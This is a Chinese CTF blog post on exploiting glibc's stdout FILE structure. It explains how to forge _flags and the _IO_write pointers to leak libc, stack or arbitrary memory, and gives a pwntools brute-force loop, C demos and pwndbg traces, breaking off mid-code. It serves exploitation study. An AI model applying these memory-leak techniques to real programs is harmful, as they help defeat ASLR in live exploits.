    <entry>
      <title>关于stdout的利用</title>
      <link href="/2025/08/21/%E5%85%B3%E4%BA%8Estdout%E7%9A%84%E5%88%A9%E7%94%A8/"/>
      <url>/2025/08/21/%E5%85%B3%E4%BA%8Estdout%E7%9A%84%E5%88%A9%E7%94%A8/</url>
      
        <content type="html"><![CDATA[<h2 id="0x00"><a href="#0x00" class="headerlink" title="0x00"></a>0x00</h2><p>复现LilCTF2025，遇到了一点对<code>_IO_2_1_stdout_</code>的利用，于是记录一下关于<code>stdout</code>的利用</p><h2 id="0x01-关于stdout"><a href="#0x01-关于stdout" class="headerlink" title="0x01 关于stdout"></a>0x01 关于stdout</h2><p><code>stdout</code>也就是<code>_IO_2_1_stdout_</code><br>在 glibc 里，标准 I&#x2F;O 流 (<code>stdin</code> &#x2F; <code>stdout</code> &#x2F; <code>stderr</code>) 都是定义在 <code>libc</code> 的全局变量</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">extern</span> <span class="class"><span class="keyword">struct</span> _<span class="title">IO_FILE_plus</span> _<span class="title">IO_2_1_stdout_</span>;</span></span><br><span class="line"><span class="keyword">extern</span> <span class="class"><span class="keyword">struct</span> _<span class="title">IO_FILE_plus</span> _<span class="title">IO_2_1_stdin_</span>;</span></span><br><span class="line"><span class="keyword">extern</span> <span class="class"><span class="keyword">struct</span> _<span class="title">IO_FILE_plus</span> _<span class="title">IO_2_1_stderr_</span>;</span></span><br></pre></td></tr></table></figure><p>这几个其实都是<code>_IO_FILE_plus</code>结构体，其<code>_fileno</code>域分别为1,0,2<br>在程序调用<code>puts</code>函数或者<code>printf</code>函数（标准IO函数）时候，使用的都是<code>_IO_2_1_stdout_</code>这个结构体<br>那么<code>write</code>函数呢？其实<code>write</code>函数只是对系统调用的封装，当你调用 <code>write(1, &quot;hi&quot;, 2)</code>，glibc 内部会直接发起 <code>syscall(SYS_write, 1, buf, 2)</code>，这里并没有对<code>_IO_2_1_stdout_</code>的使用<br>这时候可能又有疑问了，<code>SYS_write</code>不也用到了<code>fd=1</code>这个对应<code>stdout</code>的描述符吗？其实：<code>fd=1</code>是内核的概念。<code>_IO_2_1_stdout_</code> 是用户态 <code>libc</code> 提供的缓冲封装，它里面保存着 <code>fd=1</code>。<br>每个进程都有一个文件描述符表。其中默认固定<code>fd=0</code> → <code>stdin</code>，<code>fd=1</code> → <code>stdout</code>，<code>fd=2</code> → <code>stderr</code><br>通过之前对于<code>_IO_FILE</code>的<a href="https://r3t2.top/2025/07/27/%E5%85%B3%E4%BA%8E-IO-FILE/">学习</a>，我们知道在刷新缓冲区时候，系统会调用<code>write</code>输出<code>fp-&gt;_IO_write_ptr</code>到<code>fp-&gt;_IO_write_base</code>之间的内容，如果我们能修改<code>stdout-&gt;_IO_write_ptr</code>，<code>stdout-&gt;_IO_write_base</code>以及<code>stdout-&gt;_IO_write_end</code>，是不是就能在程序遇到<code>puts</code>函数或者<code>printf</code>函数，或者<code>fflush(stdout)</code>的时候输出我们想要的内容呢？</p><h2 id="0x02-stdout的利用"><a href="#0x02-stdout的利用" class="headerlink" title="0x02 stdout的利用"></a>0x02 stdout的利用</h2><p>单纯的设置<code>write</code>三元组肯定是不行的，还需要满足一些检查（具体输出流程在<a href="https://r3t2.top/2025/07/27/%E5%85%B3%E4%BA%8E-IO-FILE/">前面一篇博客</a>的<code>fwrite</code>部分有分析，而具体相关的检查源码请移步glibc源码），总结一下还需要:<br>设置<code>_flags &amp; _IO_NO_WRITES = 0</code>，设置<code>_flags &amp; _IO_CURRENTLY_PUTTING = 1</code>，设置<code>_flags &amp; _IO_IS_APPENDING = 1</code></p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">define</span> _IO_MAGIC 0xFBAD0000           <span class="comment">/* Magic number 文件结构体的魔数，用于标识文件结构体的有效性 */</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> _IO_CURRENTLY_PUTTING 0x800    <span class="comment">/* Currently putting 当前正在执行 put 操作 */</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> _IO_IS_APPENDING 0x1000        <span class="comment">/* Is appending 处于附加模式（在文件末尾追加内容） */</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> _IO_NO_WRITES 8                <span class="comment">/* Writing not allowed 不允许写入操作 */</span></span></span><br><span class="line"></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> _IO_UNBUFFERED 2               <span class="comment">/* Unbuffered 无缓冲模式，直接进行I/O操作，不使用缓冲区 */</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> _IO_LINE_BUF 0x200             <span class="comment">/* Line buffered 行缓冲模式，在输出新行时刷新缓冲区 */</span></span></span><br></pre></td></tr></table></figure><p>于是我们一般直接设置<code>_flags</code>为<code>0xfbad1800</code>即可满足，然后设置<code>_IO_write_base</code>指向想要泄露的位置，<code>_IO_write_ptr</code>指向泄露结束的地址，<code>_IO_write_end</code>要么不修改，要么修改成等于<code>_IO_write_ptr</code>，具体见<strong>0x03</strong>部分<br>有哪些利用呢？</p><h4 id="leak-libc-base"><a href="#leak-libc-base" class="headerlink" title="leak libc_base"></a>leak libc_base</h4><p>既然我们想要leak libc_base，那么我们肯定是不知道<code>_IO_2_1_stdout_</code>的地址的，这怎么利用呢？<br>在堆利用中，想要泄露libc很多时候绕不开<code>main_arena</code>，在libc中<code>main_arena</code>与<code>stdout</code>的地址是十分接近的</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">pwndbg&gt; p stdout</span><br><span class="line">$1 = (FILE *) 0x7ffff7e1b780 &lt;_IO_2_1_stdout_&gt;</span><br><span class="line">pwndbg&gt; p &amp;main_arena</span><br><span class="line">$2 = (struct malloc_state *) 0x7ffff7e1ac80 &lt;main_arena&gt;</span><br></pre></td></tr></table></figure><p>可以看到这里只有低两字节不一样，但在<code>ASLR</code>保护机制（仍然页对齐）影响下，这里低两字节中的最高位数会随机化，只有低三位（16进制下）仍然已知固定，我们可以修改指向<code>main_arena</code>的指针的低两字节，对于随机的那一位（16进制下）我们进行爆破即可（16种可能）<br>既然在打<code>stdout</code>泄露libc，说明我们收到限制，不能简单的直接查<code>unnsortedbin</code>中的chunk（不然直接<code>unsortedbin leak</code>即可），我们就需要将<code>unsortedbin</code>中chunk的fd指针也放到<code>tcache</code>或者<code>fastbin</code>中（通过具体的漏洞利用使得同一个chunk既在<code>unsortedbin</code>上，也在<code>tcache</code>或者<code>fastbin</code>上），这样我们在<code>tcache</code>或者<code>fastbin</code>中就存在一个chunk的<code>fd</code>指向<code>main_arena</code>，我们修改其低两字节，爆破随机的那1bit，就能申请到<code>stdout</code>了<br>如果是利用<code>fastbin</code>的话，我们一般利用<code>stdout-0x43</code>这个地址，我们看</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">pwndbg&gt; x/6gx 0x7ffff7e1b780 - 0x43</span><br><span class="line">0x7ffff7e1b73d &lt;_IO_2_1_stderr_+157&gt;:   0xfff7e1a8a0000000      0x000000000000007f</span><br><span class="line">0x7ffff7e1b74d &lt;_IO_2_1_stderr_+173&gt;:   0x0000000000000000      0x0000000000000000</span><br><span class="line">0x7ffff7e1b75d &lt;_IO_2_1_stderr_+189&gt;:   0x0000000000000000      0x0000000000000000</span><br></pre></td></tr></table></figure><p>正好错位形成一个size域为<code>0x7f</code>的chunk，当然错位<code>fastbin</code>的手法一般在低版本，高版本更多直接打<code>tcache</code><br>摘取一个简单的爆破模版</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">while</span> <span class="literal">True</span>:</span><br><span class="line">        <span class="keyword">try</span>:</span><br><span class="line">            io = process(file)</span><br><span class="line">            exp()</span><br><span class="line">            <span class="keyword">break</span></span><br><span class="line">        <span class="keyword">except</span>:</span><br><span class="line">            io.close()</span><br><span class="line">            <span class="keyword">continue</span></span><br></pre></td></tr></table></figure><p>在申请到<code>stdout</code>后我们覆盖其<code>_IO_write_base</code>的最低字节为<code>\x00</code>，这样在输出时候就能leak出一个libc地址</p><h4 id="leak-stack-addr"><a href="#leak-stack-addr" class="headerlink" title="leak stack addr"></a>leak stack addr</h4><p>直接打<code>stdout</code>输出<code>environ</code>值即可泄露栈地址，具体leak手法见<a href="https://r3t2.top/2025/07/07/malloc%E4%BD%8D%E4%BA%8E%E6%A0%88%E4%B8%8A%E7%9A%84chunk/">malloc位于栈上的chunk | r3t2’s blog</a></p><h4 id="其他"><a href="#其他" class="headerlink" title="其他"></a>其他</h4><p>除了leak上面两个地址，我们利用<code>stdout</code>可以实现任意地址读，只需要具体情况具体利用即可</p><h2 id="0x03-动手看看"><a href="#0x03-动手看看" class="headerlink" title="0x03 动手看看"></a>0x03 动手看看</h2><p>我们根据不同缓冲模式来调试demo</p><h4 id="无缓冲"><a href="#无缓冲" class="headerlink" title="无缓冲"></a>无缓冲</h4><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdint.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;string.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdlib.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="type">int</span> <span class="title function_">main</span><span class="params">()</span> &#123;</span><br><span class="line">    setvbuf(<span class="built_in">stdout</span>, <span class="number">0</span>, <span class="number">2</span>, <span class="number">0</span>); <span class="comment">//无缓冲</span></span><br><span class="line"></span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;printf addr is --&gt; %p\n&quot;</span>, &amp;<span class="built_in">printf</span>);</span><br><span class="line">    <span class="type">uint64_t</span> printf_addr = (<span class="type">uint64_t</span>)&amp;<span class="built_in">printf</span>;</span><br><span class="line">    <span class="type">uint64_t</span> stdout_addr = printf_addr + <span class="number">0x1bb090</span>;</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;stdout addr is --&gt; %p\n&quot;</span>, stdout_addr);</span><br><span class="line"></span><br><span class="line">    <span class="type">void</span>* victim = <span class="built_in">malloc</span>(<span class="number">0x100</span>);</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;---- input &gt;&gt;&gt; &quot;</span>);</span><br><span class="line">    read(<span class="number">0</span>, victim, <span class="number">0x10</span>);</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;---- leak  &gt;&gt;&gt; &quot;</span>);</span><br><span class="line"></span><br><span class="line">    *(<span class="type">int</span>*)stdout_addr = <span class="number">0xfbad1802</span>; <span class="comment">//无缓冲 0xfbad1800|0x2</span></span><br><span class="line"></span><br><span class="line">    ((<span class="type">uint64_t</span>*)stdout_addr)[<span class="number">1</span>] = <span class="number">0</span>;              <span class="comment">// _IO_read_ptr</span></span><br><span class="line">    ((<span class="type">uint64_t</span>*)stdout_addr)[<span class="number">2</span>] = <span class="number">0</span>;              <span class="comment">// _IO_read_end</span></span><br><span class="line">    ((<span class="type">uint64_t</span>*)stdout_addr)[<span class="number">3</span>] = <span class="number">0</span>;              <span class="comment">// _IO_read_base</span></span><br><span class="line">    ((<span class="type">uint64_t</span>*)stdout_addr)[<span class="number">4</span>] = (<span class="type">uint64_t</span>)victim;           <span class="comment">// _IO_write_base</span></span><br><span class="line">    ((<span class="type">uint64_t</span>*)stdout_addr)[<span class="number">5</span>] = (<span class="type">uint64_t</span>)victim + <span class="number">0x10</span>;    <span class="comment">// _IO_write_ptr  必须大于 base 才会写出</span></span><br><span class="line">    ((<span class="type">uint64_t</span>*)stdout_addr)[<span class="number">6</span>] = (<span class="type">uint64_t</span>)victim + <span class="number">0x10</span>;    <span class="comment">// _IO_write_end = ptr </span></span><br><span class="line"></span><br><span class="line">    <span class="built_in">puts</span>(<span class="string">&quot;new_data&quot;</span>);</span><br><span class="line"></span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>我们输入”leakleakleakleak“，运行直到<code>puts</code>前，可以看到</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br></pre></td><td class="code"><pre><span class="line">pwndbg&gt; p *stdout</span><br><span class="line">$1 = &#123;</span><br><span class="line">  _flags = -72542208,</span><br><span class="line">  _IO_read_ptr = 0x0,</span><br><span class="line">  _IO_read_end = 0x0,</span><br><span class="line">  _IO_read_base = 0x0,</span><br><span class="line">  _IO_write_base = 0x5555555592a0 &quot;leakleakleakleak&quot;,</span><br><span class="line">  _IO_write_ptr = 0x5555555592b0 &quot;&quot;,</span><br><span class="line">  _IO_write_end = 0x5555555592b0 &quot;&quot;,</span><br><span class="line">  _IO_buf_base = 0x7ffff7e1b803 &lt;_IO_2_1_stdout_+131&gt; &quot;&quot;,</span><br><span class="line">  _IO_buf_end = 0x7ffff7e1b804 &lt;_IO_2_1_stdout_+132&gt; &quot;&quot;,</span><br><span class="line">  _IO_save_base = 0x0,</span><br><span class="line">  _IO_backup_base = 0x0,</span><br><span class="line">  _IO_save_end = 0x0,</span><br><span class="line">  _markers = 0x0,</span><br><span class="line">  _chain = 0x7ffff7e1aaa0 &lt;_IO_2_1_stdin_&gt;,</span><br><span class="line">  _fileno = 1,</span><br><span class="line">  _flags2 = 0,</span><br><span class="line">  _old_offset = -1,</span><br><span class="line">  _cur_column = 0,</span><br><span class="line">  _vtable_offset = 0 &#x27;\000&#x27;,</span><br><span class="line">  _shortbuf = &quot;&quot;,</span><br><span class="line">  _lock = 0x7ffff7e1ca70 &lt;_IO_stdfile_1_lock&gt;,</span><br><span class="line">  _offset = -1,</span><br><span class="line">  _codecvt = 0x0,</span><br><span class="line">  _wide_data = 0x7ffff7e1a9a0 &lt;_IO_wide_data_1&gt;,</span><br><span class="line">  _freeres_list = 0x0,</span><br><span class="line">  _freeres_buf = 0x0,</span><br><span class="line">  __pad5 = 0,</span><br><span class="line">  _mode = -1,</span><br><span class="line">  _unused2 = &#x27;\000&#x27; &lt;repeats 19 times&gt;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p><code>stdout</code>被我们设置好，然后我们步入<code>puts</code>查看流程</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">0x7ffff7c80e50 &lt;puts&gt;       endbr64</span><br><span class="line">0x7ffff7c8b600 &lt;_IO_file_xsputn&gt;       endbr64</span><br><span class="line">0x7ffff7c8cdc0 &lt;_IO_file_overflow&gt;       endbr64</span><br><span class="line">0x7ffff7c8c930 &lt;_IO_do_write&gt;             endbr64</span><br><span class="line">0x7ffff7c8aec0 &lt;_IO_file_write&gt;       endbr64</span><br><span class="line">0x7ffff7d14870 &lt;write&gt;       endbr64</span><br><span class="line">0x7ffff7d14885 &lt;write+21&gt;    syscall  &lt;SYS_write&gt;</span><br></pre></td></tr></table></figure><p>因为设置了<code>_IO_write_end = _IO_write_ptr</code>，也就是会先触发一次overflow刷新</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">puts</span><br><span class="line">  → _IO_file_xsputn</span><br><span class="line">    → _IO_file_overflow</span><br><span class="line">      → _IO_do_write</span><br><span class="line">        → _IO_file_write</span><br><span class="line">          → write</span><br><span class="line">            → syscall(SYS_write)</span><br><span class="line"></span><br></pre></td></tr></table></figure><p>这里具体流程在此前对<code>fwrite</code>已经分析过，这一流程后续就不重复放了，最后我们看运行结果</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">printf addr is --&gt; 0x7ffff7c606f0</span><br><span class="line">stdout addr is --&gt; 0x7ffff7e1b780</span><br><span class="line">---- input &gt;&gt;&gt; leakleakleakleak</span><br><span class="line">---- leak  &gt;&gt;&gt; leakleakleakleaknew_data</span><br><span class="line"></span><br></pre></td></tr></table></figure><h4 id="行缓冲"><a href="#行缓冲" class="headerlink" title="行缓冲"></a>行缓冲</h4><p>然后我们看行缓冲下，将<code>_flags</code>设置为<code>0xfbad1a00</code>（<code>0xfbad1800|0x200</code>），并设置<code>_IO_write_end &gt; _IO_write_ptr</code></p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdint.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;string.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdlib.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="type">int</span> <span class="title function_">main</span><span class="params">()</span> &#123;</span><br><span class="line">    setvbuf(<span class="built_in">stdout</span>, <span class="number">0</span>, <span class="number">1</span>, <span class="number">0</span>); <span class="comment">//行缓冲</span></span><br><span class="line"></span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;printf addr is --&gt; %p\n&quot;</span>, &amp;<span class="built_in">printf</span>);</span><br><span class="line">    <span class="type">uint64_t</span> printf_addr = (<span class="type">uint64_t</span>)&amp;<span class="built_in">printf</span>;</span><br><span class="line">    <span class="type">uint64_t</span> stdout_addr = printf_addr + <span class="number">0x1bb090</span>;</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;stdout addr is --&gt; %p\n&quot;</span>, stdout_addr);</span><br><span class="line"></span><br><span class="line">    <span class="type">void</span>* victim = <span class="built_in">malloc</span>(<span class="number">0x100</span>);</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;---- input &gt;&gt;&gt;\n&quot;</span>);</span><br><span class="line">    read(<span class="number">0</span>, victim, <span class="number">0x10</span>);</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;---- leak  &gt;&gt;&gt;\n&quot;</span>);</span><br><span class="line"></span><br><span class="line">    *(<span class="type">int</span>*)stdout_addr = <span class="number">0xfbad1a00</span>; <span class="comment">// 0xfbad1800|0x200</span></span><br><span class="line"></span><br><span class="line">    ((<span class="type">uint64_t</span>*)stdout_addr)[<span class="number">1</span>] = <span class="number">0</span>;              <span class="comment">// _IO_read_ptr</span></span><br><span class="line">    ((<span class="type">uint64_t</span>*)stdout_addr)[<span class="number">2</span>] = <span class="number">0</span>;              <span class="comment">// _IO_read_end</span></span><br><span class="line">    ((<span class="type">uint64_t</span>*)stdout_addr)[<span class="number">3</span>] = <span class="number">0</span>;              <span class="comment">// _IO_read_base</span></span><br><span class="line">    ((<span class="type">uint64_t</span>*)stdout_addr)[<span class="number">4</span>] = (<span class="type">uint64_t</span>)victim;           <span class="comment">// _IO_write_base</span></span><br><span class="line">    ((<span class="type">uint64_t</span>*)stdout_addr)[<span class="number">5</span>] = (<span class="type">uint64_t</span>)victim + <span class="number">0x10</span>;    <span class="comment">// _IO_write_ptr  必须大于 base 才会写出</span></span><br><span class="line">    ((<span class="type">uint64_t</span>*)stdout_addr)[<span class="number">6</span>] = (<span class="type">uint64_t</span>)victim + <span class="number">0x100</span>;    <span class="comment">// _IO_write_end &gt; ptr </span></span><br><span class="line"></span><br><span class="line">    <span class="built_in">puts</span>(<span class="string">&quot;new_data&quot;</span>);</span><br><span class="line"></span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>这里程序无输出，直到exit后才触发刷新</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line">pwndbg&gt; b exit</span><br><span class="line">Breakpoint 1 at 0x7ffff7c455f0: file ./stdlib/exit.c, line 142.</span><br><span class="line">pwndbg&gt; r</span><br><span class="line">Starting program: /home/r3t2/CTF/pwn_demos/stdout/demo</span><br><span class="line">[Thread debugging using libthread_db enabled]</span><br><span class="line">Using host libthread_db library &quot;/lib/x86_64-linux-gnu/libthread_db.so.1&quot;.</span><br><span class="line">printf addr is --&gt; 0x7ffff7c606f0</span><br><span class="line">stdout addr is --&gt; 0x7ffff7e1b780</span><br><span class="line">---- input &gt;&gt;&gt;</span><br><span class="line">a</span><br><span class="line">---- leak  &gt;&gt;&gt;</span><br><span class="line"></span><br><span class="line">Breakpoint 1, __GI_exit (status=0) at ./stdlib/exit.c:142</span><br><span class="line">...</span><br><span class="line">pwndbg&gt; c</span><br><span class="line">Continuing.</span><br><span class="line">a</span><br><span class="line">new_data</span><br><span class="line">[Inferior 1 (process 55881) exited normally</span><br></pre></td></tr></table></figure><p>这是为什么？这时候我们如果将<code>_IO_write_end</code>设置与<code>_IO_write_ptr</code>相等，则</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">((<span class="type">uint64_t</span>*)stdout_addr)[<span class="number">6</span>] = (<span class="type">uint64_t</span>)victim + <span class="number">0x10</span>;    <span class="comment">// _IO_write_end == _IO_write_ptr</span></span><br></pre></td></tr></table></figure><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line">pwndbg&gt; b exit</span><br><span class="line">Breakpoint 1 at 0x7ffff7c455f0: file ./stdlib/exit.c, line 142.</span><br><span class="line">pwndbg&gt; r</span><br><span class="line">Starting program: /home/r3t2/CTF/pwn_demos/stdout/demo</span><br><span class="line">[Thread debugging using libthread_db enabled]</span><br><span class="line">Using host libthread_db library &quot;/lib/x86_64-linux-gnu/libthread_db.so.1&quot;.</span><br><span class="line">printf addr is --&gt; 0x7ffff7c606f0</span><br><span class="line">stdout addr is --&gt; 0x7ffff7e1b780</span><br><span class="line">---- input &gt;&gt;&gt;</span><br><span class="line">a</span><br><span class="line">---- leak  &gt;&gt;&gt;</span><br><span class="line">a</span><br><span class="line">new_data</span><br><span class="line"></span><br><span class="line">Breakpoint 1, __GI_exit (status=0) at ./stdlib/exit.c:142</span><br></pre></td></tr></table></figure><p>可以看到<code>puts(&quot;new_data&quot;)</code>成功刷新了输出<br>而如果我们不设置<code>_IO_write_end</code></p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">//((uint64_t*)stdout_addr)[6] = (uint64_t)victim + 0x100;    // _IO_write_end</span></span><br></pre></td></tr></table></figure><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line">pwndbg&gt; b exit</span><br><span class="line">Breakpoint 1 at 0x7ffff7c455f0: file ./stdlib/exit.c, line 142.</span><br><span class="line">pwndbg&gt; r</span><br><span class="line">Starting program: /home/r3t2/CTF/pwn_demos/stdout/demo</span><br><span class="line">[Thread debugging using libthread_db enabled]</span><br><span class="line">Using host libthread_db library &quot;/lib/x86_64-linux-gnu/libthread_db.so.1&quot;.</span><br><span class="line">printf addr is --&gt; 0x7ffff7c606f0</span><br><span class="line">stdout addr is --&gt; 0x7ffff7e1b780</span><br><span class="line">---- input &gt;&gt;&gt;</span><br><span class="line">c</span><br><span class="line">---- leak  &gt;&gt;&gt;</span><br><span class="line">c</span><br><span class="line">new_data</span><br><span class="line"></span><br><span class="line">Breakpoint 1, __GI_exit (status=0) at ./stdlib/exit.c:142</span><br></pre></td></tr></table></figure><p>可以看到输出也没问题<br>这里推测是我们如果修改<code>_IO_write_end</code>，会导致<code>stdout</code>的缓冲区异常，要么就不设置。如果设置的话则应使<code>_IO_write_end</code>&#x3D;&#x3D;<code>_IO_write_ptr</code>，会先一步触发<code>overflow</code>，然后程序会重新分配<code>write</code>三元组指针，后续输出操作也就不会出问题</p><h4 id="全缓冲"><a href="#全缓冲" class="headerlink" title="全缓冲"></a>全缓冲</h4><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdint.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;string.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdlib.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="type">int</span> <span class="title function_">main</span><span class="params">()</span> &#123;</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;printf addr is --&gt; %p\n&quot;</span>, &amp;<span class="built_in">printf</span>);</span><br><span class="line">    <span class="type">uint64_t</span> printf_addr = (<span class="type">uint64_t</span>)&amp;<span class="built_in">printf</span>;</span><br><span class="line">    <span class="type">uint64_t</span> stdout_addr = printf_addr + <span class="number">0x1bb090</span>;</span><br><span 